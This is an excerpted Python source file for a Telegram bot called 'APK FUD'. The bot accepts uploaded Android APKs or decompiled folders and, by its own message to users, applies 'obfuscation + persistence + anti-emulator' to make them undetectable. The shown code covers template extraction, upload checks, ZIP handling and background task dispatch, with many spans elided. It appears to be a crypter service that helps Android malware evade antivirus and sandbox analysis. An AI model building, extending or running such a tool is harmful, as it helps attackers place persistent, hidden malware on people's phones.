...
class FUDApkMaker:
    ...
    def prepare_apk(self):
        """Use pre-decompiled base or decompile if needed"""
        base_zip = os.path.join(DATA_DIR, "base_apk.zip")
        
        if os.path.exists(base_zip):
            self._progress("Using pre-decompiled template...")
            os.makedirs(self.decompiled_dir, exist_ok=True)
            with zipfile.ZipFile(base_zip, 'r') as zf:
                zf.extractall(self.decompiled_dir)
            # Find the actual decompiled folder (might be nested)
            items = os.listdir(self.decompiled_dir)
            if len(items) == 1 and os.path.isdir(os.path.join(self.decompiled_dir, items[0])):
                # If extracted folder is nested, move contents up
                nested = os.path.join(self.decompiled_dir, items[0])
                for f in os.listdir(nested):
                    shutil.move(os.path.join(nested, f), self.decompiled_dir)
                os.rmdir(nested)
            return True
        else:
...
'''
    ...
    def make_fud(self, progress_callback=None):
        try:
            ...
            # Use pre-decompiled base or decompile
            self.prepare_apk()
...
APK FUD
- Upload any APK file (.apk) or ZIP containing decompiled APK (.zip)
...
async def process_apk_background(update, context, apk_path, original_filename, status_msg, temp_dir):
    ...
    try:
        ...
        msg += f"📦 Original: {original_filename}\n"
        ...
        if CHANNEL_ID:
            try:
                ...
                channel_msg += f"📦 {original_filename}\n"
...
def extract_zip_for_apk(zip_path, target_dir):
    """Extract ZIP and find APK or decompiled folder"""
    with zipfile.ZipFile(zip_path, 'r') as zf:
        zf.extractall(target_dir)
    
    # Look for APK file
    apk_found = None
    decompiled_folder = None
    
    for root, dirs, files in os.walk(target_dir):
        for f in files:
            if f.endswith('.apk'):
                apk_found = os.path.join(root, f)
                break
        if apk_found:
            break
    
    # Look for decompiled APK folder (has AndroidManifest.xml + smali)
    for root, dirs, files in os.walk(target_dir):
        if 'AndroidManifest.xml' in files and 'smali' in dirs:
            decompiled_folder = root
            break
    
    return apk_found, decompiled_folder
...
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if data == "cancel":
        ...
        await safe_edit(
            query,
            "Send me the APK file (.apk) or ZIP file containing APK/decompiled folder.\n\nI'll apply obfuscation + persistence + anti-emulator.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return WAITING_APK
...
async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if doc.mime_type:
        if 'apk' in doc.mime_type.lower():
            is_apk = True
        if 'zip' in doc.mime_type.lower():
            is_zip = True

    if not is_apk and not is_zip:
        keyboard = [[get_cancel_button()]]
        await update.message.reply_text(
            "❌ Please send a valid APK file (.apk) or ZIP file (.zip).",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return WAITING_APK

    print(f"✅ File detected: {file_name} (APK: {is_apk}, ZIP: {is_zip})")
    ...
    print(f"✅ Downloaded file to {file_path} ({os.path.getsize(file_path) / 1024 / 1024:.1f} MB)")
    ...
    if is_zip:
        ...
        apk_found, decompiled_folder = extract_zip_for_apk(file_path, extract_dir)
        
        if decompiled_folder:
            # Found decompiled APK folder — use it directly
            print(f"✅ Found decompiled folder at: {decompiled_folder}")
            # We'll let the maker use this as-is
            apk_path = file_path  # Keep zip path, maker will handle
            context.user_data['decompiled_folder'] = decompiled_folder
            await status_msg.edit_text("📦 Found decompiled APK folder! Processing...")
        elif apk_found:
            # Found APK inside ZIP
            apk_path = apk_found
            original_name = os.path.basename(apk_found)
            print(f"✅ Found APK inside ZIP: {original_name}")
            await status_msg.edit_text(f"📦 Found APK: {original_name}")
        else:
            await status_msg.edit_text("❌ No APK or decompiled folder found in ZIP.")
            shutil.rmtree(temp_dir, ignore_errors=True)
            return ConversationHandler.END

    # Launch background task
    task = asyncio.create_task(
        process_apk_background(update, context, apk_path, original_name, status_msg, temp_dir)
    )
